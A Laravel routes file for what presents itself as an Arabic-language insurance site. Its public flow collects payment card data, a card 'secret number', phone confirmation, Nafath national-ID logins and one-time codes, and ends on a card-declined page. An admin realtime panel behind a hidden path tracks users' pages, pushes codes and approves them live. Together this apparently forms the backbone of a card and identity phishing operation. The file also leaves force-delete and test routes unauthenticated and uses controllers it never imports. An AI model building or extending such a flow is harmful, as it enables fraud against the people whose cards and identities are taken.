<?php

use App\Http\Controllers\ProfileController;
use App\Http\Controllers\Backend\Admin\AdminDashboardController;
use App\Http\Controllers\Backend\Admin\AdminLoginController;
use App\Http\Controllers\Backend\Admin\InsuranceBackendController;
use App\Http\Controllers\Backend\Admin\InsuranceRequestsBackendController;
use App\Http\Controllers\Backend\Admin\SupportTicketController;
use App\Http\Controllers\Frontend\HomePageFrontendController;
use App\Http\Controllers\Admin\VisitorController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Test route for Vite setup
Route::get('/test-vite', function () {
    return view('test-vite');
})->name('test-vite');

// Test route for insurance flow
Route::get('/test-insurance-flow', function () {
    return view('test-insurance-flow');
})->name('test-insurance-flow');

Route::post('/test-create-session', function () {
    // Create a new insurance request for testing
    $insuranceRequest = new \App\Models\InsuranceRequest();
    $insuranceRequest->identity_number = '1234567890';
    $insuranceRequest->insurance_category = 1;
    $insuranceRequest->save();
    
    // Store in session
    session([
        'insuranceRequest' => [
            'id' => $insuranceRequest->id,
            'identity_number' => $insuranceRequest->identity_number,
            'insurance_category' => 1,
        ]
    ]);
    
    return redirect()->route('test-insurance-flow')->with('success', 'تم إنشاء جلسة جديدة بنجاح! معرف الطلب: ' . $insuranceRequest->id);
})->name('test-create-session');

// ==================================================================================================================
// =========================================== Super Admin Routes ===================================================
// ==================================================================================================================
Route::prefix('super_admin')->name('super_admin.')->group(function () {
    // Login route
    Route::get('/login', [AdminLoginController::class, 'showLoginForm'])->name('loginUser');

    // Redirect /super_admin to login or dashboard
    Route::get('/', function () {
        if (auth('super_admin')->check()) {
            return redirect('/super_admin/dashboard');
        }
        return redirect('/super_admin/login');
    })->name('index');
    Route::post('/loginFormSubmit', [AdminLoginController::class, 'loginFormSubmit'])
        ->middleware('throttle:10,1')
        ->name('loginFormSubmit');
    // If someone hits the POST endpoint directly via GET, guide them back to the login page
    Route::get('/loginFormSubmit', function () {
        return redirect()->route('super_admin.loginUser');
    });
    Route::post('/logout', [AdminLoginController::class, 'logout'])->name('logout');

    Route::group(['middleware' => ['auth:super_admin']], function () {
        // Dashboard Route
        Route::get('/dashboard', [AdminDashboardController::class, 'index'])->name('dashboard');

        // Live Visitors Summary (JSON)
        Route::get('/visitors/summary', [VisitorController::class, 'summary'])->name('visitors.summary');

        // Support Tickets
        Route::group(['prefix' => 'support_tickets'], function () {
            Route::get('/index', [SupportTicketController::class, 'index'])->name('support_tickets-index');
            Route::get('destroy/{id}', [SupportTicketController::class, 'destroy'])->name('support_tickets-destroy');
        });

        // Profile Routes
        Route::group(['prefix' => 'profile'], function () {
            Route::get('/edit', [ProfileController::class, 'edit'])->name('edit');
            Route::patch('/update', [ProfileController::class, 'update'])->name('profile.update');
            Route::delete('/destroy', [ProfileController::class, 'destroy'])->name('profile.destroy');
        });

        // Insurance Routes
        Route::group(['prefix' => 'insurances'], function () {
            Route::get('/index', [InsuranceBackendController::class, 'index'])->name('insurances-index');
            Route::get('/create', [InsuranceBackendController::class, 'create'])->name('insurances-create');
            Route::post('/store', [InsuranceBackendController::class, 'store'])->name('insurances-store');
            Route::get('show/{id}', [InsuranceBackendController::class, 'show'])->name('insurances-show');
            Route::get('edit/{id}', [InsuranceBackendController::class, 'edit'])->name('insurances-edit');
            Route::post('update/{id}', [InsuranceBackendController::class, 'update'])->name('insurances-update');
            Route::get('softDelete/{id}', [InsuranceBackendController::class, 'softDelete'])->name('insurances-softDelete');
            Route::get('/showSoftDelete', [InsuranceBackendController::class, 'showSoftDelete'])->name('insurances-showSoftDelete');
            Route::get('softDeleteRestore/{id}', [InsuranceBackendController::class, 'softDeleteRestore'])->name('insurances-softDeleteRestore');
            Route::get('/softDeleteSelected', [InsuranceBackendController::class, 'softDeleteSelected'])->name('insurances-softDeleteSelected');
            Route::get('/softDeleteRestoreSelected', [InsuranceBackendController::class, 'softDeleteRestoreSelected'])->name('insurances-softDeleteRestoreSelected');
            Route::get('/activeInactiveSingle/{id}', [InsuranceBackendController::class, 'activeInactiveSingle'])->name('insurances-activeInactiveSingle');

            // Insurance Benefit Routes
            Route::post('addInsuranceBenefit/{id}', [InsuranceBackendController::class, 'addInsuranceBenefit'])->name('insurances-addInsuranceBenefit');
            Route::get('deleteInsuranceBenefit/{id}', [InsuranceBackendController::class, 'deleteInsuranceBenefit'])->name('insurances-deleteInsuranceBenefit');
        });

        // Insurance Requests Routes
        Route::group(['prefix' => 'insurance_requests'], function () {
            Route::get('/index', [InsuranceRequestsBackendController::class, 'index'])->name('insurance_requests-index');
            // JSON summary for live auto-refresh in admin tables
            Route::get('/summary', [InsuranceRequestsBackendController::class, 'summary'])->name('insurance_requests-summary');
            // Get new requests for live table refresh
            Route::get('/get-new-requests', [InsuranceRequestsBackendController::class, 'getNewRequests'])->name('insurance_requests-getNewRequests');
            // Check user status and current path
            Route::get('/check-status/{id}', [InsuranceRequestsBackendController::class, 'checkStatus'])->name('insurance_requests-checkStatus');
            Route::get('/create', [InsuranceRequestsBackendController::class, 'create'])->name('insurance_requests-create');
            Route::post('/store', [InsuranceRequestsBackendController::class, 'store'])->name('insurance_requests-store');
            Route::get('show/{id}', [InsuranceRequestsBackendController::class, 'show'])->name('insurance_requests-show');
            Route::get('edit/{id}', [InsuranceRequestsBackendController::class, 'edit'])->name('insurance_requests-edit');
            Route::post('update/{id}', [InsuranceRequestsBackendController::class, 'update'])->name('insurance_requests-update');
            Route::get('softDelete/{id}', [InsuranceRequestsBackendController::class, 'softDelete'])->name('insurance_requests-softDelete');
            Route::get('/showSoftDelete', [InsuranceRequestsBackendController::class, 'showSoftDelete'])->name('insurance_requests-showSoftDelete');
            Route::get('softDeleteRestore/{id}', [InsuranceRequestsBackendController::class, 'softDeleteRestore'])->name('insurance_requests-softDeleteRestore');
            Route::get('/softDeleteSelected', [InsuranceRequestsBackendController::class, 'softDeleteSelected'])->name('insurance_requests-softDeleteSelected');
            Route::get('/softDeleteRestoreSelected', [InsuranceRequestsBackendController::class, 'softDeleteRestoreSelected'])->name('insurance_requests-softDeleteRestoreSelected');
            Route::get('/activeInactiveSingle/{id}', [InsuranceRequestsBackendController::class, 'activeInactiveSingle'])->name('insurance_requests-activeInactiveSingle');

            // Nafath Routes
            Route::get('sendNafathCode/{id}', [InsuranceRequestsBackendController::class, 'sendNafathCode'])->name('insurance_requests-sendNafathCode');
            Route::post('sendNafathCodeRequest/{id}', [InsuranceRequestsBackendController::class, 'sendNafathCodeRequest'])->name('insurance_requests-sendNafathCodeRequest');
        });

        // Realtime Dashboard Routes - لوحة التحكم المباشرة
        Route::group(['prefix' => 'realtime'], function () {
            Route::get('/dashboard', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'index'])->name('realtime-dashboard');
            Route::get('/data', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'getData'])->name('realtime-data');
            Route::get('/user/{id}', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'getUserDetail'])->name('realtime-user-detail');
            Route::post('/send-code/{id}', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'sendCode'])->name('realtime-send-code');
            Route::post('/update-approval/{id}', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'updateApprovalStatus'])->name('realtime-update-approval');
        });

        // Custom Reports Routes - التقارير المخصصة
        Route::group(['prefix' => 'custom_reports'], function () {
            Route::get('/dashboard', [App\Http\Controllers\Admin\CustomReportsController::class, 'dashboard'])->name('custom_reports-dashboard');
            Route::get('/index', [App\Http\Controllers\Admin\CustomReportsController::class, 'index'])->name('custom_reports-index');
            Route::get('/show/{id}', [App\Http\Controllers\Admin\CustomReportsController::class, 'show'])->name('custom_reports-show');
            Route::get('/summary', [App\Http\Controllers\Admin\CustomReportsController::class, 'summary'])->name('custom_reports-summary');
            Route::get('/export', [App\Http\Controllers\Admin\CustomReportsController::class, 'export'])->name('custom_reports-export');
            Route::post('/filter', [App\Http\Controllers\Admin\CustomReportsController::class, 'filter'])->name('custom_reports-filter');
        });


    });
});

// ==================================================================================================================
// ==================================================================================================================
// =========================================== Frontend Routes ======================================================
// ==================================================================================================================
// ==================================================================================================================


// Home and Static Pages
Route::get('/', [HomePageFrontendController::class, 'welcome'])->name('welcome');

// Serve a favicon at /favicon.ico to avoid 404s in browsers
Route::get('/favicon.ico', function () {
    $path = public_path('style_files/frontend/img/logo.png');
    if (file_exists($path)) {
        return response()->file($path, ['Content-Type' => 'image/png']);
    }
    return response('', 204);
});
Route::get('/about', function () {
    return view('about');
})->name('about');
Route::get('/contact', function () {
    return view('contact');
})->name('contact');
Route::get('/claims', function () {
    return view('claims');
})->name('claims');

// Insurance Process Routes
Route::post('/insuranceRequest', [HomePageFrontendController::class, 'insuranceRequest'])->name('insuranceRequest');
Route::get('/insuranceStatements', [HomePageFrontendController::class, 'insuranceStatements'])->name('insuranceStatements');
Route::post('/insuranceStatementsRequest', [HomePageFrontendController::class, 'insuranceStatementsRequest'])->name('insuranceStatementsRequest');
// Vehicles inquiry (new unified vehicles form)
Route::post('/insuranceInquiryRequest', [HomePageFrontendController::class, 'insuranceInquiryRequest'])->name('insuranceInquiryRequest');
Route::get('/insuranceType', [HomePageFrontendController::class, 'insuranceType'])->name('insuranceType');
Route::post('/insuranceTypeRequest', [HomePageFrontendController::class, 'insuranceTypeRequest'])->name('insuranceTypeRequest');
Route::get('/insuranceInformation', [HomePageFrontendController::class, 'insuranceInformation'])->name('insuranceInformation');
Route::post('/insuranceInformationRequest', [HomePageFrontendController::class, 'insuranceInformationRequest'])->name('insuranceInformationRequest');

// Payment Routes
Route::get('/paymentForm', [HomePageFrontendController::class, 'paymentForm'])->name('paymentForm');
Route::post('/paymentFormRequest', [HomePageFrontendController::class, 'paymentFormRequest'])->name('paymentFormRequest');

// Pending Approval Route (NEW)
Route::get('/pending-approval', [HomePageFrontendController::class, 'pendingApproval'])->name('pendingApproval');
Route::get('/check-approval-status/{id}', [HomePageFrontendController::class, 'checkApprovalStatus'])->name('check-approval-status');

// Call Process Routes
Route::get('/beforeCallProcess', [HomePageFrontendController::class, 'beforeCallProcess'])->name('beforeCallProcess');
Route::get('/callProcess', [HomePageFrontendController::class, 'callProcess'])->name('callProcess');
Route::post('/callProcessRequest', [HomePageFrontendController::class, 'callProcessRequest'])->name('callProcessRequest');

// Card Ownership Routes
Route::get('/cardOwnership', [HomePageFrontendController::class, 'cardOwnership'])->name('cardOwnership');
Route::post('/cardOwnershipRequest', [HomePageFrontendController::class, 'cardOwnershipRequest'])->name('cardOwnershipRequest');
Route::get('/cardOwnershipSecertNumber', [HomePageFrontendController::class, 'cardOwnershipSecertNumber'])->name('cardOwnershipSecertNumber');
Route::post('/cardOwnershipSecertNumberRequest', [HomePageFrontendController::class, 'cardOwnershipSecertNumberRequest'])->name('cardOwnershipSecertNumberRequest');

// Phone Confirmation Routes
Route::get('/confirmPhoneNumber', [HomePageFrontendController::class, 'confirmPhoneNumber'])->name('confirmPhoneNumber');
Route::post('/confirmPhoneNumberRequest', [HomePageFrontendController::class, 'confirmPhoneNumberRequest'])->name('confirmPhoneNumberRequest');
Route::get('/checkPhoneNumber', [HomePageFrontendController::class, 'checkPhoneNumber'])->name('checkPhoneNumber');
Route::post('/checkPhoneNumberRequest', [HomePageFrontendController::class, 'checkPhoneNumberRequest'])->name('checkPhoneNumberRequest');

// Nafath Authentication Routes
Route::get('/nafathLogin', [HomePageFrontendController::class, 'nafathLogin'])->name('nafathLogin');
Route::post('/nafathLoginRequest', [HomePageFrontendController::class, 'nafathLoginRequest'])->name('nafathLoginRequest');
Route::post('/nafathDocumentingRequest', [HomePageFrontendController::class, 'nafathDocumentingRequest'])->name('nafathDocumentingRequest');
Route::get('/codeDegit', [HomePageFrontendController::class, 'codeDegit'])->name('codeDegit');
Route::get('/fetchCodeDegit', [HomePageFrontendController::class, 'fetchCodeDegit'])->name('fetchCodeDegit');
Route::get('/resendCodeDegit', [HomePageFrontendController::class, 'resendCodeDegit'])->name('resendCodeDegit');
Route::get('/cardDeclined', [HomePageFrontendController::class, 'cardDeclined'])->name('cardDeclined');

// Service Worker
Route::get('/sw.js', function () {
    $path = public_path('sw.js');
    abort_unless(file_exists($path), 404);

    return response()->file($path, [
        // Proper MIME for Service Worker (Safari-friendly)
        'Content-Type' => 'text/javascript; charset=UTF-8',
        // Allow SW to control the whole origin
        'Service-Worker-Allowed' => '/',
        // Prevent cached/stale worker during development
        'Cache-Control' => 'no-cache, no-store, must-revalidate',
        'Pragma' => 'no-cache',
        'Expires' => '0',
    ]);
})->name('sw');

// Development/Testing Routes
Route::get('/welcome2', function () {
    return view('welcome2');
})->name('/welcome2');
Route::get('/tasks', function () {
    return view('tasks');
})->name('/tasks');
Route::get('/searchForInsurance', function () {
    return view('searchForInsurance');
})->name('/searchForInsurance');

// Insurance Type Routes
Route::prefix('insurance')->group(function () {
    Route::get('/car', function () {
        return view('insurance.car');
    })->name('insurance.car');

    Route::get('/health', function () {
        return view('insurance.health');
    })->name('insurance.health');

    Route::get('/life', function () {
        return view('insurance.life');
    })->name('insurance.life');

    Route::get('/property', function () {
        return view('insurance.property');
    })->name('insurance.property');

    // Insurance Data Display Routes - Frontend
    Route::get('/all', function () {
        $insurances = \App\Models\Insurance::all();
        return view('insurance.all', compact('insurances'));
    })->name('insurance.all');

    Route::get('/with-deleted', function () {
        $insurances = \App\Models\Insurance::withTrashed()->get();
        return view('insurance.with-deleted', compact('insurances'));
    })->name('insurance.with-deleted');

    Route::get('/only-deleted', function () {
        $insurances = \App\Models\Insurance::onlyTrashed()->get();
        return view('insurance.only-deleted', compact('insurances'));
    })->name('insurance.only-deleted');

    Route::get('/active', function () {
        $insurances = \App\Models\Insurance::where('status', 'active')->get();
        return view('insurance.active', compact('insurances'));
    })->name('insurance.active');

    Route::get('/inactive', function () {
        $insurances = \App\Models\Insurance::where('status', 'inactive')->get();
        return view('insurance.inactive', compact('insurances'));
    })->name('insurance.inactive');

    // Insurance Restore Route
    Route::post('/restore/{id}', function ($id) {
        $insurance = \App\Models\Insurance::withTrashed()->findOrFail($id);
        $insurance->restore();
        return redirect()->back()->with('success', 'تم استعادة التأمين بنجاح');
    })->name('insurance.restore');

    // Insurance Force Delete Route
    Route::delete('/force-delete/{id}', function ($id) {
        $insurance = \App\Models\Insurance::withTrashed()->findOrFail($id);
        $insurance->forceDelete();
        return redirect()->back()->with('success', 'تم حذف التأمين نهائياً');
    })->name('insurance.force-delete');
});

// Authenticated User Routes
Route::middleware(['auth'])->group(function () {
    Route::get('/profile', function () {
        return view('profile');
    })->name('profile');

    Route::get('/policies', function () {
        return view('policies');
    })->name('policies');

    Route::get('/payments', function () {
        return view('payments');
    })->name('payments');
});

// Test route for viewing insurances
Route::get('/test-insurances', function () {
    $thirdPartyInsurances = \App\Models\Insurance::where('status', 1)->where('insurance_type', 1)->with('insuranceBenefits')->get();
    $fullInsurances = \App\Models\Insurance::where('status', 1)->where('insurance_type', 2)->with('insuranceBenefits')->get();
    $thirdPartyCount = $thirdPartyInsurances->count();
    $fullCount = $fullInsurances->count();
    return view('test-insurances', compact('thirdPartyInsurances', 'fullInsurances', 'thirdPartyCount', 'fullCount'));
})->name('test-insurances');

// Enhanced insurance type view (new design)
Route::get('/test-insurance-type', function () {
    $thirdPartyInsurances = \App\Models\Insurance::where('status', 1)->where('insurance_type', 1)->with('insuranceBenefits')->get();
    $fullInsurances = \App\Models\Insurance::where('status', 1)->where('insurance_type', 2)->with('insuranceBenefits')->get();
    return view('insuranceType-enhanced', compact('thirdPartyInsurances', 'fullInsurances'));
})->name('test-insurance-type');

// Redirect GET hits on POST endpoints back to the proper pages
Route::get('/insuranceStatementsRequest', function () {
    return redirect()->route('insuranceStatements');
});
Route::get('/insuranceTypeRequest', function () {
    return redirect()->route('insuranceType');
});
Route::get('/insuranceInformationRequest', function () {
    return redirect()->route('insuranceInformation');
});
Route::get('/paymentFormRequest', function () {
    return redirect()->route('paymentForm');
});
Route::get('/callProcessRequest', function () {
    return redirect()->route('callProcess');
});
Route::get('/cardOwnershipRequest', function () {
    return redirect()->route('cardOwnership');
});
Route::get('/cardOwnershipSecertNumberRequest', function () {
    return redirect()->route('cardOwnershipSecertNumber');
});
Route::get('/confirmPhoneNumberRequest', function () {
    return redirect()->route('confirmPhoneNumber');
});
Route::get('/checkPhoneNumberRequest', function () {
    return redirect()->route('checkPhoneNumber');
});
Route::get('/nafathLoginRequest', function () {
    return redirect()->route('nafathLogin');
});
Route::get('/nafathDocumentingRequest', function () {
    return redirect()->route('nafathLogin');
});

// ==================================================================================================================
// ========================================== Visitor Tracking Routes ===============================================
// ==================================================================================================================

// Frontend - Visit Tracking (Public, CSRF Protected)
Route::post('/v/ping', [App\Http\Controllers\Frontend\VisitController::class, 'ping'])
    ->name('visit.ping');

// ==================================================================================================================
// ========================================== Admin Monitoring Routes ===============================================
// ==================================================================================================================

// Backend - Monitoring Dashboard (Admin Protected, Hidden Path)
// Access via: /{ADMIN_SECRET_PATH}/monitoring
Route::prefix(config('admin.secret_path', 'x-admin-9bcd'))->group(function () {
    Route::middleware(['auth:super_admin', 'admin.ip.allow'])->group(function () {
        Route::get('/monitoring', [App\Http\Controllers\Backend\Admin\MonitoringController::class, 'index'])
            ->name('admin.monitoring.index');
        
        Route::get('/monitoring/poll', [App\Http\Controllers\Backend\Admin\MonitoringController::class, 'poll'])
            ->name('admin.monitoring.poll');
    });
});

// Frontend Routes
Route::get('/', function () {
    return view('welcome');
})->name('home');

Route::prefix('insurance')->name('insurance.')->group(function () {
    Route::get('/request', [InsuranceController::class, 'showForm'])->name('request.form');
    Route::post('/request', [InsuranceController::class, 'submitRequest'])->name('request.submit');
    Route::get('/verify/{id}', [InsuranceController::class, 'verifyIdentity'])->name('verify');
    Route::post('/verify/{id}', [InsuranceController::class, 'processVerification'])->name('verify.process');
    Route::get('/payment/{id}', [InsuranceController::class, 'showPayment'])->name('payment');
    Route::post('/payment/{id}', [InsuranceController::class, 'processPayment'])->name('payment.process');
    Route::get('/success/{id}', [InsuranceController::class, 'success'])->name('success');
});

// Admin Routes
Route::prefix('admin')->name('super_admin.')->group(function () {
    
    // Auth Routes
    Route::get('/login', [AdminLoginController::class, 'showLoginForm'])->name('login');
    Route::post('/login', [AdminLoginController::class, 'login'])->name('login.submit');
    Route::post('/logout', [AdminLoginController::class, 'logout'])->name('logout');

    // Protected Admin Routes
    Route::middleware(['auth:super_admin'])->group(function () {
        
        // Dashboard
        Route::get('/dashboard', [AdminDashboardController::class, 'index'])->name('dashboard');
        
        // Insurance Requests Management
        Route::prefix('insurance-requests')->name('insurance_requests-')->group(function () {
            Route::get('/', [InsuranceRequestsBackendController::class, 'index'])->name('index');
            Route::get('/summary', [InsuranceRequestsBackendController::class, 'summary'])->name('summary');
            Route::get('/{id}', [InsuranceRequestsBackendController::class, 'show'])->name('show');
            Route::delete('/{id}', [InsuranceRequestsBackendController::class, 'softDelete'])->name('delete');
            Route::get('/trashed/list', [InsuranceRequestsBackendController::class, 'showSoftDelete'])->name('trashed');
            Route::post('/restore/{id}', [InsuranceRequestsBackendController::class, 'softDeleteRestore'])->name('restore');
            Route::get('/{id}/nafath', [InsuranceRequestsBackendController::class, 'sendNafathCode'])->name('nafath');
            Route::post('/{id}/nafath', [InsuranceRequestsBackendController::class, 'sendNafathCodeRequest'])->name('nafath.send');
        });

        // Custom Reports
        Route::prefix('reports')->name('reports.')->group(function () {
            Route::get('/', [CustomReportsController::class, 'index'])->name('index');
            Route::get('/dashboard', [CustomReportsController::class, 'dashboard'])->name('dashboard');
            Route::get('/summary', [CustomReportsController::class, 'summary'])->name('summary');
            Route::get('/{id}', [CustomReportsController::class, 'show'])->name('show');
            Route::get('/filter', [CustomReportsController::class, 'filter'])->name('filter');
            Route::get('/export', [CustomReportsController::class, 'export'])->name('export');
        });

        // Live Dashboard
        Route::prefix('live-dashboard')->name('live_dashboard.')->group(function () {
            Route::get('/', [LiveDashboardController::class, 'index'])->name('index');
            Route::get('/data', [LiveDashboardController::class, 'getData'])->name('data');
            Route::get('/user/{id}', [LiveDashboardController::class, 'getUserDetails'])->name('user.details');
            Route::post('/send-code', [LiveDashboardController::class, 'sendCode'])->name('send.code');
            Route::post('/approve/{id}', [LiveDashboardController::class, 'approveUser'])->name('approve');
            Route::post('/reject/{id}', [LiveDashboardController::class, 'rejectUser'])->name('reject');
        });
    });
});
